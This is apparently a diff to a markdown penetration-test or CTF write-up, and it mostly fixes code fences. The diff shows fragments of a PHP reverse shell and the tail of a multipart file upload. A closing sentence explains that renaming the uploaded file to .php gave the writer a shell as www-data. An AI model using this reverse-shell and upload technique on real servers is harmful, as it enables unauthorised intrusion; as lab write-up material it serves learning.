@@ -127,6 +127,7 @@ $daemon = 0;
 $debug = 0;
 ```
 
+```php
 //
 // Daemonise ourself if possible to avoid zombies later
 //
@@ -211,12 +212,10 @@ while (1) {
 		break;
 	}
 
-```bash
 	// Wait until a command is end down $sock, or some
 	// command output is available on STDOUT or STDERR
 	$read_a = array($sock, $pipes[1], $pipes[2]);
 	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
-```
 
 	// If we can read from the TCP socket, send
 	// data to process's STDIN
@@ -266,6 +265,8 @@ function printit ($string) {
 -----------------------------12628579074434046793284635447--
 
 <!--  -->
+
+```
 
 Once that request went through, the last piece was making sure the uploaded file would actually be interpreted as PHP rather than served back as a static image, so I renamed it, adding a `.php` extension onto the file that was now sitting on the server, and browsing to that new path handed me a shell as `www-data`.
 
